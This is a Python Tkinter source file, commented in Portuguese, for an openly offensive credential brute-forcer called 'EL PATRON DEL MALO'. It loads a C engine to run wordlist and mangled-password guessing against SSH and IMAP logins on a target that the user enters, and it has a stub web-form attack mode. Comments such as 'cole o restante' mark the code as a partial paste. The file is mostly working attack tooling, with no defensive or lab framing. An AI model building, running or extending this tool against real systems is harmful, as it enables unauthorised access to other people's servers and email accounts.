import tkinter as tk
from tkinter import ttk, font, filedialog, scrolledtext
import threading
import time
import ctypes
import os

# --- Carregando o Coração de C (Inalterado) ---
try:
    engine_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'engine.so')
    c_engine = ctypes.CDLL(engine_path)
    c_engine.attempt_ssh.argtypes = [ctypes.c_char_p, ctypes.c_char_p, ctypes.c_char_p]
    c_engine.attempt_ssh.restype = ctypes.c_int
    c_engine.attempt_imap.argtypes = [ctypes.c_char_p, ctypes.c_char_p, ctypes.c_char_p]
    c_engine.attempt_imap.restype = ctypes.c_int
    ENGINE_LOADED = True
except Exception as e:
    ENGINE_LOADED = False
    ENGINE_ERROR = str(e)


class CombinationBruteForcerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("EL PATRON DEL MALO // Arsenal Híbrido v5")
        self.root.geometry("1200x800")
        self.root.configure(bg="#0d0d0d")
        self.running = False

        self.setup_styles()
        self.create_widgets()

        if not ENGINE_LOADED:
            self.log_message(f"ERRO CRÍTICO: Motor C não carregado. Causa: {ENGINE_ERROR}", "error")

    def setup_styles(self):
        # (Estilos Inalterados)
        self.style = ttk.Style()
        self.style.theme_create("area51", parent="alt", settings={
            "TFrame": {"configure": {"background": "#0d0d0d"}},
            "TLabel": {"configure": {"background": "#0d0d0d", "foreground": "#9aedfe", "font": ("Consolas", 12)}},
            "TButton": {"configure": {"padding": 10, "font": ("Consolas", 12, "bold"), "relief": "flat", "borderwidth": 1}},
            "TRadiobutton": {"configure": {"background": "#0d0d0d", "foreground": "#9aedfe", "font": ("Consolas", 12), "indicatoron": 0, "padding": 10, "relief": "flat"}, "map": {"background": [("active", "#2a2a2a"), ("selected", "#003344")]}},
            "TEntry": {"configure": {"fieldbackground": "#1a1a1a", "foreground": "white", "insertcolor": "white", "relief": "flat", "font": ("Consolas", 11)}},
            "TCombobox": {"configure": {"fieldbackground": "#1a1a1a", "foreground": "white", "relief": "flat", "font": ("Consolas", 11), "arrowcolor": "#9aedfe"}},
            "Vertical.TScrollbar": {"configure": {"background": "#1a1a1a", "troughcolor": "#0d0d0d", "arrowcolor": "#9aedfe", "bordercolor":"#333"}}
        })
        self.style.configure("Start.TButton", background="#004d00", foreground="#c8ffc8", bordercolor="#00ff00")
        self.style.map("Start.TButton", background=[("active", "#006d00")])
        self.style.configure("Stop.TButton", background="#8b0000", foreground="#ffc8c8", bordercolor="#ff0000")
        self.style.map("Stop.TButton", background=[("active", "#ad0000")])
        self.style.configure("Browse.TButton", background="#1a1a1a", foreground="#9aedfe", bordercolor="#9aedfe")
        self.style.map("Browse.TButton", background=[("active", "#2a2a2a")])
        self.style.theme_use("area51")

    def create_widgets(self):
        main_frame = ttk.Frame(self.root)
        main_frame.pack(expand=True, fill="both", padx=20, pady=20)
        
        control_container = ttk.Frame(main_frame, width=450)
        control_container.pack(side="left", fill="y", padx=(0, 20))
        control_container.pack_propagate(False)

        canvas = tk.Canvas(control_container, bg="#0d0d0d", highlightthickness=0)
        scrollbar = ttk.Scrollbar(control_container, orient="vertical", command=canvas.yview, style="Vertical.TScrollbar")
        self.scrollable_frame = ttk.Frame(canvas)
        self.scrollable_frame.bind("<Configure>", lambda e: canvas.configure(scrollregion=canvas.bbox("all")))
        canvas.create_window((0, 0), window=self.scrollable_frame, anchor="nw")
        canvas.configure(yscrollcommand=scrollbar.set)
        canvas.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")
        
        control_panel = self.scrollable_frame
        
        art_font = font.Font(family="Consolas", size=25, weight="bold")
        art_label = tk.Label(control_panel, text="EL PATRON DEL MALO", font=art_font, bg="#0d0d0d", fg="#ff4500")
        art_label.pack(pady=20, anchor="w", padx=10)

        mode_label = ttk.Label(control_panel, text="PROTOCOLO:")
        mode_label.pack(anchor="w", pady=(10, 5), padx=10)
        self.mode = tk.StringVar(value="ssh")
        
        # --- OPÇÃO "SITE" RESTAURADA ---
        ttk.Radiobutton(control_panel, text="IP (SSH)", variable=self.mode, value="ssh", command=self.toggle_url_field).pack(fill="x", pady=2, padx=10)
        ttk.Radiobutton(control_panel, text="Email (IMAP)", variable=self.mode, value="imap", command=self.toggle_url_field).pack(fill="x", pady=2, padx=10)
        ttk.Radiobutton(control_panel, text="Site (Web Form)", variable=self.mode, value="web", command=self.toggle_url_field).pack(fill="x", pady=2, padx=10)

        target_label = ttk.Label(control_panel, text="ALVO (IP / Servidor):")
        target_label.pack(anchor="w", pady=(20, 5), padx=10)
        self.target_entry = ttk.Entry(control_panel)
        self.target_entry.pack(fill="x", padx=10)

        # --- CAMPO DE URL RESTAURADO (INICIALMENTE OCULTO) ---
        self.url_label = ttk.Label(control_panel, text="URL DA PÁGINA DE LOGIN:")
        self.url_entry = ttk.Entry(control_panel)
        
        user_label = ttk.Label(control_panel, text="USUÁRIO / EMAIL:")
        user_label.pack(anchor="w", pady=(10, 5), padx=10)
        self.user_entry = ttk.Entry(control_panel)
        self.user_entry.pack(fill="x", padx=10)
        
        # O resto do painel de controle permanece o mesmo...
        combo_label = ttk.Label(control_panel, text="FORJA DE MUNIÇÕES:")
        combo_label.pack(anchor="w", pady=(20, 5), padx=10)
        self.wordlist1_path = tk.StringVar()
        ttk.Label(control_panel, text="Wordlist Base (A):").pack(anchor="w", padx=10)
        base_frame = ttk.Frame(control_panel)
        base_frame.pack(fill="x", pady=(2,10), padx=10)
        ttk.Entry(base_frame, textvariable=self.wordlist1_path, state="readonly").pack(side="left", expand=True, fill="x")
        ttk.Button(base_frame, text="...", style="Browse.TButton", command=lambda: self.browse_wordlist(self.wordlist1_path), width=4).pack(side="right")
        self.wordlist2_path = tk.StringVar()
        ttk.Label(control_panel, text="Wordlist Sufixo (B):").pack(anchor="w", padx=10)
        suffix_frame = ttk.Frame(control_panel)
        suffix_frame.pack(fill="x", pady=(2,10), padx=10)
        ttk.Entry(suffix_frame, textvariable=self.wordlist2_path, state="readonly").pack(side="left", expand=True, fill="x")
        ttk.Button(suffix_frame, text="...", style="Browse.TButton", command=lambda: self.browse_wordlist(self.wordlist2_path), width=4).pack(side="right")
        ttk.Label(control_panel, text="Modo de Combinação:").pack(anchor="w", padx=10)
        self.combo_mode = ttk.Combobox(control_panel, state="readonly", values=["Dicionário Simples (A)", "Concatenação (A + B)", "Mangle Simples (A + Mutações)", "Híbrido Completo (A + B + Mutações)"])
        self.combo_mode.set("Dicionário Simples (A)")
        self.combo_mode.pack(fill="x", padx=10)
        button_panel = ttk.Frame(control_panel)
        button_panel.pack(fill="x", pady=40, padx=10)
        button_panel.columnconfigure(0, weight=1)
        button_panel.columnconfigure(1, weight=1)
        self.start_button = ttk.Button(button_panel, text="INICIAR ATAQUE", style="Start.TButton", command=self.start_protocol)
        self.start_button.grid(row=0, column=0, sticky="ew", padx=(0, 5))
        self.stop_button = ttk.Button(button_panel, text="PARAR", style="Stop.TButton", command=self.stop_protocol, state="disabled")
        self.stop_button.grid(row=0, column=1, sticky="ew", padx=(5, 0))
        
        log_panel = ttk.Frame(main_frame)
        log_panel.pack(side="right", expand=True, fill="both")
        log_label = ttk.Label(log_panel, text="TRANSMISSÃO DE DADOS:")
        log_label.pack(anchor="w")
        self.log_text = scrolledtext.ScrolledText(log_panel, bg="#000000", fg="#00ff41", font=("Consolas", 11), relief="flat", state="disabled")
        self.log_text.pack(expand=True, fill="both", pady=5)
        self.log_text.tag_config('error', foreground='#ff4500')
        self.log_text.tag_config('success', foreground='#ffff00')
        self.log_text.tag_config('info', foreground='#9aedfe')
        self.log_text.tag_config('warning', foreground='#ffa500')
        
        # Chama a função uma vez para garantir que o estado inicial esteja correto
        self.toggle_url_field()

    # --- FUNÇÃO RESTAURADA PARA CONTROLAR CAMPO DE URL ---
    def toggle_url_field(self):
        if self.mode.get() == "web":
            # Insere os widgets do URL na posição correta
            self.url_label.pack(anchor="w", pady=(10, 5), padx=10, before=self.user_entry.master)
            self.url_entry.pack(fill="x", padx=10, before=self.user_entry.master)
        else:
            # Remove os widgets do URL
            self.url_label.pack_forget()
            self.url_entry.pack_forget()

    def brute_force_worker(self):
        # ... (código existente)
        # --- LÓGICA DE ATAQUE ATUALIZADA PARA O MODO WEB ---
        
        target = self.target_entry.get()
        user = self.user_entry.get()
        combo_mode = self.combo_mode.get()
        wlist1 = self.wordlist1_path.get()
        wlist2 = self.wordlist2_path.get()
        
        self.log_message(f"Iniciando protocolo em modo '{self.mode.get().upper()}'", "info")
        password_gen = self.password_generator(combo_mode, wlist1, wlist2)
        if not password_gen:
            self.root.after(0, self.reset_ui)
            return
            
        found = False
        count = 0
        for password in password_gen:
            if not self.running: break
            count += 1
            if count % 20 == 0: self.log_message(f"Tentativa #{count}: {password}")

            attack_mode = self.mode.get()
            
            if attack_mode in ["ssh", "imap"]:
                # Usa o motor C para SSH e IMAP
                target_b = target.encode('utf-8')
                user_b = user.encode('utf-8')
                pass_b = password.encode('utf-8')
                result = c_engine.attempt_ssh(target_b, user_b, pass_b) if attack_mode == "ssh" else c_engine.attempt_imap(target_b, user_b, pass_b)
                if result == 1:
                    found = True
            
            elif attack_mode == "web":
                # --- PONTO DE ADAPTAÇÃO WEB ---
                # Motor C é ignorado. A lógica é puramente Python.
                # O Mestre deve inserir sua lógica de 'requests' aqui.
                self.log_message(f"Tentando (Web): {user} com a senha: {password}")
                self.log_message("AVISO: Lógica de ataque web precisa ser implementada pelo Mestre.", "warning")
                time.sleep(0.5) # Simula a latência de uma requisição web
                # Exemplo: if "senha_correta_indicador" in requests.post(...): found = True
            
            if found:
                self.log_message("="*50, "success")
                self.log_message(f"ALVO NEUTRALIZADO! SENHA: {password}", "success")
                self.log_message("="*50, "success")
                break
        
        if self.running and not found:
            self.log_message(f"Ataque concluído após {count} tentativas. Senha não encontrada.", "error")
        
        self.root.after(0, self.reset_ui)

    # O resto das funções (browse_wordlist, log_message, password_generator, start/stop, reset)
    # permanecem as mesmas.
    # ... (cole o restante das funções da versão anterior aqui)
    def browse_wordlist(self, path_var):
        path = filedialog.askopenfilename(title="Selecione uma Wordlist")
        if path:
            path_var.set(path)
            self.log_message(f"Wordlist carregada: {os.path.basename(path)}", "info")
    def log_message(self, msg, tag=None):
        self.root.after(0, self._insert_log, msg, tag)
    def _insert_log(self, msg, tag):
        self.log_text.config(state="normal")
        self.log_text.insert(tk.END, f"> {msg}\n", tag)
        self.log_text.see(tk.END)
        self.log_text.config(state="disabled")
    def password_generator(self, mode, wlist1_path, wlist2_path):
        mangler_suffixes = ['1', '12', '123', '!', '@', '#']
        try:
            with open(wlist1_path, 'r', errors='ignore') as f1:
                wlist1 = [line.strip() for line in f1 if line.strip()]
        except FileNotFoundError:
            self.log_message(f"ERRO: Wordlist Base não encontrada em '{wlist1_path}'", "error")
            return
        wlist2 = []
        if "B" in mode:
            try:
                with open(wlist2_path, 'r', errors='ignore') as f2:
                    wlist2 = [line.strip() for line in f2 if line.strip()]
            except FileNotFoundError:
                self.log_message(f"ERRO: Wordlist Sufixo não encontrada em '{wlist2_path}'", "error")
                return
        if mode == "Dicionário Simples (A)":
            for word_a in wlist1: yield word_a
        elif mode == "Concatenação (A + B)":
            for word_a in wlist1:
                for word_b in wlist2: yield word_a + word_b
        elif mode == "Mangle Simples (A + Mutações)":
            for word_a in wlist1:
                yield word_a
                for suffix in mangler_suffixes: yield word_a + suffix
                if word_a:
                    yield word_a.capitalize()
                    yield word_a.capitalize() + '123'
        elif mode == "Híbrido Completo (A + B + Mutações)":
            for word_a in wlist1:
                for word_b in wlist2:
                    base = word_a + word_b
                    yield base
                    for suffix in mangler_suffixes: yield base + suffix
    def start_protocol(self):
        wlist1 = self.wordlist1_path.get()
        combo_mode = self.combo_mode.get()
        if not all([self.target_entry.get(), self.user_entry.get(), wlist1]):
            self.log_message("ERRO: Preencha Alvo, Usuário e Wordlist Base.", "error")
            return
        if "B" in combo_mode and not self.wordlist2_path.get():
            self.log_message("ERRO: Este modo de combinação requer uma Wordlist Sufixo.", "error")
            return
        if self.mode.get() == "web" and not self.url_entry.get():
            self.log_message("ERRO: O modo Site requer uma URL da Página de Login.", "error")
            return
        self.running = True
        self.start_button.config(state="disabled")
        self.stop_button.config(state="normal")
        thread = threading.Thread(target=self.brute_force_worker)
        thread.daemon = True
        thread.start()
    def stop_protocol(self):
        if self.running:
            self.running = False
            self.stop_button.config(state="disabled")
            self.log_message("Sinal de interrupção enviado...", "warning")
    def reset_ui(self):
        self.running = False
        self.start_button.config(state="normal")
        self.stop_button.config(state="disabled")

if __name__ == "__main__":
    root = tk.Tk()
    app = CombinationBruteForcerGUI(root)
    root.mainloop()
